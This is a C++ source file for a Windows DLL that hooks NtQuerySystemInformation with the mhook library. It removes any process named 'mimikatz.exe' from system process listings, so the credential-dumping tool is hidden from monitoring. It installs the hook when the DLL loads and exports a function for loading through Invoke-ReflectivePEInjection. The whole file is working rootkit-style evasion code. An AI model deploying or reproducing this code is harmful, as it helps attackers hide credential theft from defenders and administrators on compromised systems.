#include "stdafx.h"
#include "mhook/mhook-lib/mhook.h"

//////////////////////////////////////////////////////////////////////////
// Defines and typedefs

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

typedef struct _MY_SYSTEM_PROCESS_INFORMATION 
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS (WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID SystemInformation,
    __in       ULONG SystemInformationLength,
    __out_opt  PULONG ReturnLength
    );

//////////////////////////////////////////////////////////////////////////
// Original function

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = 
    (PNT_QUERY_SYSTEM_INFORMATION)::GetProcAddress(::GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");

//////////////////////////////////////////////////////////////////////////
// Hooked function

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID                    SystemInformation,
    __in       ULONG                    SystemInformationLength,
    __out_opt  PULONG                   ReturnLength
    )
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        //
        // Loop through the list of processes
        //

        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
        PMY_SYSTEM_PROCESS_INFORMATION pNext    = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
        
        do
        {
            pCurrent = pNext;
            pNext    = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

            if (!wcsncmp(pNext->ImageName.Buffer, L"mimikatz.exe", pNext->ImageName.Length))
            {
                if (0 == pNext->NextEntryOffset)
                {
                    pCurrent->NextEntryOffset = 0;
                }
                else
                {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }

                pNext = pCurrent;
            }            
        } 
        while(pCurrent->NextEntryOffset != 0);
    }

    return status;
}

//////////////////////////////////////////////////////////////////////////
// Entry point


BOOL WINAPI DllMain(
    __in HINSTANCE  hInstance,
    __in DWORD      Reason,
    __in LPVOID     Reserved
    )
{        
    switch (Reason)
    {
    case DLL_PROCESS_ATTACH:
        Mhook_SetHook((PVOID*)&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
        break;

    case DLL_PROCESS_DETACH:
        Mhook_Unhook((PVOID*)&OriginalNtQuerySystemInformation);
        break;
    }

    return TRUE;
}

//Use for Invoke-ReflectivePEInjection
extern "C" __declspec(dllexport) void VoidFunc()
{        
    
    Mhook_SetHook((PVOID*)&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
        

}